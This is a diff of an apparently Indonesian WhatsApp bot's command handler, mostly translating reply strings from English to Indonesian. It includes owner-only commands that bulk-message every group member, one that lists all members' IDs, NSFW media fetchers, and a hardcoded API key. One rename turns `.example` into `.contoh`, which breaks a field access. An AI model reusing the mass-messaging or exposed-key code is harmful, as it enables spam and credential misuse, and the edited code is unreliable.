+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break 
 case 'carbon':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'whitebear':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'metallic':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'steel':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'fabric':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'ancient':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'marvel':
-if(!q) return replygcNFS(`Example: ${prefix + command} ajg`)
+if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
 NFSStickWait()
 maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
     `${q}`,])
-  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'tiktokgirl':
@@ -4992,16 +4861,16 @@ var hasil = pickRandom(notnot)
 NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
 break
 case 'animewallpaper2': case 'animewall2': {
-                if (!args.join(" ")) return replygcNFS("What wallpaper are you looking for??")
+                if (!args.join(" ")) return replygcNFS("Wallpaper apa yang Anda cari??")
 		let { wallpaper } = require('./lib/scraperW')
                 anu = await wallpaper(args)
                 result = anu[Math.floor(Math.random() * anu.length)]
-                NFSBotInc.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
+                NFSBotInc.sendMessage(m.chat, { caption: `Judul : ${result.title}\nKategori : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
             }
             break
 case 'animewall': case 'animewallpaper':
 const { AnimeWallpaper } =require("anime-wallpaper")
-if(!q) return replygcNFS('What wallpaper do you want?')
+if(!q) return replygcNFS('Wallpaper apa yang Anda inginkan?')
 NFSStickWait()
 const wall = new AnimeWallpaper()
     const pages = [1,2,3,4]
@@ -5010,13 +4879,12 @@ const wall = new AnimeWallpaper()
             .getAnimeWall4({ title: q, type: "sfw", page: pages })
             .catch(() => null)
 const i = Math.floor(Math.random() * wallpaper.length)    
-            await NFSBotInc.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
+            await NFSBotInc.sendMessage(m.chat, { caption: `*Pertanyaan :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                     return('Error!')
                 })
 //NFSBotInc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
 break
 case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
-
 NFSStickWait()
 let heyy
 if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/akira.json')
@@ -5149,19 +5017,19 @@ replygcNFS(util.format(_syntax + _err))
 break
 case 'pushcontact': {
     if (!NFSTheCreator) return NFSStickOwner()
-      if (!m.isGroup) return replygcNFS(`The feature works only in grup`)
+      if (!m.isGroup) return replygcNFS(`Fitur ini hanya berfungsi di grup`)
     if (!text) return replygcNFS(`text?`)
     let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
-    replygcNFS(`Success in pushing the message to contacts`)
+    replygcNFS(`Sukses dalam mendorong pesan ke kontak`)
     for (let pler of mem) {
     NFSBotInc.sendMessage(pler, { text: q})
      }  
-     replygcNFS(`Done`)
+     replygcNFS(`Selesai`)
       }
       break
 case "pushcontactv2":{
 if (!NFSTheCreator) return NFSStickOwner()
-if (!q) return replygcNFS(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
+if (!q) return replygcNFS(`Penggunaan yang Salah Silakan Gunakan Perintah Seperti Ini\n${prefix+command} idgc|text`)
 NFSStickWait()
 const metadata2 = await NFSBotInc.groupMetadata(q.split("|")[0])
 const halss = metadata2.participants
@@ -5169,7 +5037,7 @@ for (let mem of halss) {
 NFSBotInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
 await sleep(5000)
 }
-replygcNFS(`Success`)
+replygcNFS(`Berhasil`)
 }
 break
 
@@ -5181,7 +5049,7 @@ break
           	if(!NFSTheCreator) return NFSStickOwner()
         const groupMetadata = m.isGroup ? await NFSBotInc.groupMetadata(m.chat).catch((e) => {}) : ""
 		const participants = m.isGroup ? await groupMetadata.participants : ""
-    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
+    let textt = `_Berikut adalah alamat jid dari semua pengguna_\n *- ${groupMetadata.subject}*\n\n`
     for (let mem of participants) {
             textt += `${themeemoji} ${mem.id}\n`
         }
@@ -5190,8 +5058,8 @@ break
     break
           case 'emojimix': {
 		let [emoji1, emoji2] = text.split`+`
-		if (!emoji1) return replygcNFS(`Example : ${prefix + command} 😅+🤔`)
-		if (!emoji2) return replygcNFS(`Example : ${prefix + command} 😅+🤔`)
+		if (!emoji1) return replygcNFS(`*Contoh :* ${prefix + command} 😅+🤔`)
+		if (!emoji2) return replygcNFS(`*Contoh :* ${prefix + command} 😅+🤔`)
 		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
 		for (let res of anumojimix.results) {
 		    let encmedia = await NFSBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
@@ -5201,19 +5069,18 @@ break
 	    break
 	case 'hentaivid2': {
 if (!m.isGroup) return NFSStickGroup()
-
 if (!AntiNsfw) return replygNFS(mess.nsfw)
 NFSStickWait()
 sbe = await hentaivid()
 cejd = sbe[Math.floor(Math.random(), sbe.length)]
 NFSBotInc.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
-caption: `⭔ Title : ${cejd.title}
-⭔ Category : ${cejd.category}
-⭔ Mimetype : ${cejd.type}
-⭔ Views : ${cejd.views_count}
-⭔ Shares : ${cejd.share_count}
-⭔ Source : ${cejd.link}
-⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
+caption: `⭔ Judul : ${cejd.title}
+⭔ Kategori : ${cejd.category}
+⭔ Tipe Anime : ${cejd.type}
+⭔ Tampilan : ${cejd.views_count}
+⭔ Saham : ${cejd.share_count}
+⭔ Sumber : ${cejd.link}
+⭔ Url Media : ${cejd.video_1}` }, { quoted: m })
 }
 break
 	case 'hentaivid': case 'hentaivideo': {
@@ -5223,7 +5090,7 @@ if (!AntiNsfw) return replygcNFS(mess.nsfw)
                 const { hentai } = require('./lib/scraper.js')
                 anu = await hentai()
                 result912 = anu[Math.floor(Math.random(), anu.length)]
-                NFSBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
+                NFSBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Judul : ${result912.title}\n${themeemoji} Kategori : ${result912.category}\n${themeemoji} Tipe Anime : ${result912.type}\n${themeemoji} Tampilan : ${result912.views_count}\n${themeemoji} Saham : ${result912.share_count}\n${themeemoji} Sumber : ${result912.link}\n${themeemoji} Url Media : ${result912.video_1}` }, { quoted: m })
             }
             break
 case 'trap' :
@@ -5233,15 +5100,13 @@ NFSStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
 NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
 break
-case 'hentai-neko' :
-case 'hneko' :
+case 'hentai-neko' : case 'hneko' :
 if (!m.isGroup) return NFSStickGroup()
 if (!AntiNsfw) return replygcNFS(mess.nsfw)
     waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
 break
-case 'hentai-waifu' :
-case 'nwaifu' :
+case 'hentai-waifu' : case 'nwaifu' :
 if (!m.isGroup) return NFSStickGroup()
 if (!AntiNsfw) return replygcNFS(mess.nsfw)
 NFSStickWait()
@@ -5267,7 +5132,7 @@ if (!m.isGroup) return NFSStickGroup()
 if (!AntiNsfw) return replygcNFS(mess.nsfw)
 NFSStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
-            await NFSBotInc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
+            await NFSBotInc.sendMessage(m.chat, { caption:  `Ini dia!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -5839,75 +5704,75 @@ NFSStickWait()
 break
     case 'igemoji': 
 case 'instagramemoji': 
-if (!q) return replygcNFS("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukkan emoji, maksimal 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "11")
 break
 case 'iphoneemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "0")
 break
 case 'googleemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "1")
 break
 case 'samsungemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "2")
 break
 case 'microsoftemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "3")
 break
 case 'whatsappemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "4")
 break
 case 'twitteremoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "5")
 break
 case 'facebookemoji': 
 case 'fbemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "6")
 break
 case 'skypeemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "7")
 break
 case 'joyemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "8")
 break
 case 'mojiemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "9")
 case 'pediaemoji': 
-if (!q) return replygcNFS("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
+if (!q) return replygcNFS("Masukan emoji, max 1 emoji, misal?" + ` ${prefix + command} 😀`)
 NFSStickWait()
 emote(q, "10")
 break
 case 'emoji': {
-if (!args.join(" ")) return replygcNFS('Where is the emoji?')
+if (!args.join(" ")) return replygcNFS('Dimana emojinya?')
 emoji.get(args.join(" ")).then(async(emoji) => {
-let mese = await NFSBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
-await NFSBotInc.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
+let mese = await NFSBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Dibuat oleh ${global.botname}`}, {quoted:m})
+await NFSBotInc.sendMessage(from, {text:"balas # pada gambar ini untuk membuat stiker"}, {quoted:mese})
 })
 }
 break
 case 'volume': {
-if (!args.join(" ")) return replygcNFS(`Example: ${prefix + command} 10`)
+if (!args.join(" ")) return replygcNFS(`*Contoh :* ${prefix + command} 10`)
 media = await NFSBotInc.downloadAndSaveMediaMessage(quoted, "volume")
 if (isQuotedAudio) {
 rname = getRandom('.mp3')
@@ -5928,7 +5793,7 @@ NFSBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
 fs.unlinkSync(rname)
 })
 } else {
-replygcNFS("Send video/audio")
+replygcNFS("Kirim video/audio")
 }
 }
 break
@@ -5945,8 +5810,8 @@ break
   }
  break
 case 'git': case 'gitclone':
-if (!args[0]) return replygcNFS(`Where is the link?\nExample :\n${prefix}${command} https://github.com/Blawuken/NFSMedia`)
-if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcNFS(`Link invalid!!`)
+if (!args[0]) return replygcNFS(`Di mana tautannya?\n*Contoh :*\n${prefix}${command} https://github.com/Blawuken/NFSMedia`)
+if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcNFS(`Tautan tidak valid!!`)
 let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let [, user, repo] = args[0].match(regex1) || []
     repo = repo.replace(/.git$/, '')
@@ -5956,15 +5821,15 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
 break
 case "spotify":{
 if (!isPrem) return replyprem(mess.premium)
-if (!text) return replygcNFS(`Where is the link?`)
+if (!text) return replygcNFS(`Di mana tautannya?`)
         const Spotify = require('./lib/spotify')
         const spotify = new Spotify(text)
         const info = await spotify.getInfo()
-        if ((info).error) return replygcNFS(`The link you provided is not spotify link`)
+        if ((info).error) return replygcNFS(`Tautan yang Anda berikan bukan tautan spotify`)
         const { name, artists, album_name, release_date, cover_url } = info
-        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
+        const details = `${themeemoji} *Judul:* ${name || ''}\n${themeemoji} *Artis:* ${(artists || []).join(
             ','
-        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
+        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Tanggal rilis:* ${release_date || ''}`
        const response = await NFSBotInc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
         const bufferpotify = await spotify.download()
         await NFSBotInc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
@@ -5996,97 +5861,92 @@ case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat':
                 NFSBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                 fs.unlinkSync(ran)
                 })
-                } else replygcNFS(`Reply to the audio you want to change with a caption *${prefix + command}*`)
+                } else replygcNFS(`Balas ke audio yang ingin Anda ubah dengan teks *${prefix + command}*`)
                 } catch (e) {
                 replygcNFS(e)
                 }
                 break
                 case 'define': 
-if (!q) return replygcNFS(`What do you want to define?`)
+if (!q) return replygcNFS(`Apa yang ingin Anda definisikan?`)
 try {
 targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
 if (!targetfine) return replygcNFS(mess.error)
 const reply = `
-*${themeemoji} Word:* ${q}
-*${themeemoji} Definition:* ${targetfine.data.list[0].definition
+*${themeemoji} Kata:* ${q}
+*${themeemoji} Definisi:* ${targetfine.data.list[0].definition
     .replace(/\[/g, "")
     .replace(/\]/g, "")}
-*${themeemoji} Example:* ${targetfine.data.list[0].example
+*${themeemoji} Contoh:* ${targetfine.data.list[0].contoh
     .replace(/\[/g, "")
     .replace(/\]/g, "")}`
    NFSBotInc.sendMessage(m.chat,{text:reply},{quoted:m})
 } catch (err) {
     console.log(err)
-    return replygcNFS(`*${q}* isn't a valid text`)
+    return replygcNFS(`*${q}* bukan teks yang valid`)
     }
     break
-                case 'can': {
-            	if (!text) return replygcNFS(`Ask question\n\nExample : ${prefix + command} i dance?`)
-            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
+                case 'can': case 'bisakah': {
+            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} aku menari?`)
+            	let bisa = [`Bisa`,`Tidak bisa`,`Mungkin`,`Tentu saja Anda bisa!!!`]
                 let keh = bisa[Math.floor(Math.random() * bisa.length)]
-                let jawab = `*Can ${text}*\nAnswer : ${keh}`
+                let jawab = `*${keh}`
             await replygcNFS(jawab)
             }
             break
-            case 'is': {
-            	if (!text) return replygcNFS(`Ask question\n\nExample : ${prefix + command} she virgin?`)
-            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
+            case 'is': case 'apakah': {
+            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} dia perawan?`)
+            	let apa = [`Ya`, `TIDAK`, `Bisa jadi`, `Itu benar`]
                 let kah = apa[Math.floor(Math.random() * apa.length)]
-                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
+                let jawab = `${kah}`                
             await replygcNFS(jawab)
             }
             break
-            case 'when': {
-            	if (!text) return replygcNFS(`Ask question\n\nExample : ${prefix + command} will i get married?`)
-            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
+            case 'when': case 'kapan': {
+            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} apakah saya akan menikah?`)
+            	let kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagis','3 Tahun Lagis','4 Tahun Lagis','5 Tahun Lagis','Besok','Lusa','Mben']
                 let koh = kapan[Math.floor(Math.random() * kapan.length)]
-                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
+                let jawab = `${koh}`                
             await replygcNFS(jawab)
             }
             break
-case 'what': {
-            	if (!text) return replygcNFS(`Ask question\n\nExample : ${prefix + command} is your name?`)
-            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
+case 'what': case 'apa': {
+            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} adalah namamu?`)
+            	let lel = [`Tanya Nenekmu`, `Tanya Ibumu`, `Aku tidak tahu`, `Aku tidak tahu`, `Tanya Ayahmu`, `Nama kamu adalah *Yanto*`]
                 let kah = lel[Math.floor(Math.random() * lel.length)]
-                let jawab = `*What ${text}*\nAnswer : ${kah}`                
+                let jawab = `${kah}`                
             await replygcNFS(jawab)
             }
             break
-case 'where': {
-if (!text) return replygcNFS(`Ask question\n\nExample : ${prefix + command} is your name?`)
-            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
+case 'where': case 'dimana': {
+if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} Tempat tinggalku?`)
+            	let wherelol = [`Di Gunung`, `Di Mars`, `Di bulan`,`Di dalam hutan`,`Aku tidak tahu tanya ibumu`,`Itu bisa di suatu tempat`]
                 let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
-                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
+                let jawab = `${kah}`              
             await replygcNFS(jawab)
             }
             break
-case 'how': {
-            	if (!text) return replygcNFS(`Ask question\n\nExample : ${prefix + command} to date girl?`)
-            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
+case 'how': case 'bagaimana': {
+            	if (!text) return replygcNFS(`Bertanya\n\n*Contoh :* ${prefix + command} berkencan dengan gadis?`)
+            	let gimana = [`Ummm...`, `Susahnya Bang`, `Maaf Bot Tidak Bisa Menjawab`, `Coba Cari Di Google`,`Astaga! Benar-benar???`,`Pusing Ah😴`, `tidak mau menjawab`,`Ohhh saya lihat🙂`,`Mboh`, `Jangan membuatku pusing😞`,`Benar-benar bung 🙄`]
                 let kah = gimana[Math.floor(Math.random() * gimana.length)]
-                let jawab = `*How ${text}*\nAnswer : ${kah}`                
+                let jawab = `${kah}`                
             await replygcNFS(jawab)
             }
             break
 case 'rate': {
-            	if (!text) return replygcNFS(`Example : ${prefix + command} my profile`)
+            	if (!text) return replygcNFS(`*Contoh :* ${prefix + command} Profil saya`)
             	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                 let kah = ra[Math.floor(Math.random() * ra.length)]
-                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
+                let jawab = `${kah}%`                
             await replygcNFS(jawab)
             }
             break
             case 'runtime': {
-            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
+            	let lowq = `*Bot Telah Aktif Sejak:*\n*${runtime(process.uptime())}*`
                 replygcNFS(lowq)
             	}
             break
-            case 'stupidcheck':case 'uncleancheck':
-case 'hotcheck': case 'smartcheck':
-case 'greatcheck':
-case 'evilcheck':case 'dogcheck':
-case 'coolcheck':
-case 'waifucheck':
+            case 'stupidcheck':case 'uncleancheck': case 'hotcheck': case 'smartcheck': case 'greatcheck': case 'evilcheck':case 'dogcheck': case 'coolcheck': case 'waifucheck':
 cantik = body.slice(1)
 const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 const NFSkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
@@ -6098,7 +5958,7 @@ break
             let me = m.sender
             let jodoh = member[Math.floor(Math.random() * member.length)]
 NFSBotInc.sendMessage(m.chat,
-{ text: `👫Your Soulmate Is
+{ text: `👫Belahan Jiwa Anda Adalah
 
 @${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
 contextInfo:{
@@ -6124,7 +5984,7 @@ isForwarded: true,
             let jodoh = member[Math.floor(Math.random() * member.length)]
 NFSBotInc.sendMessage(m.chat,
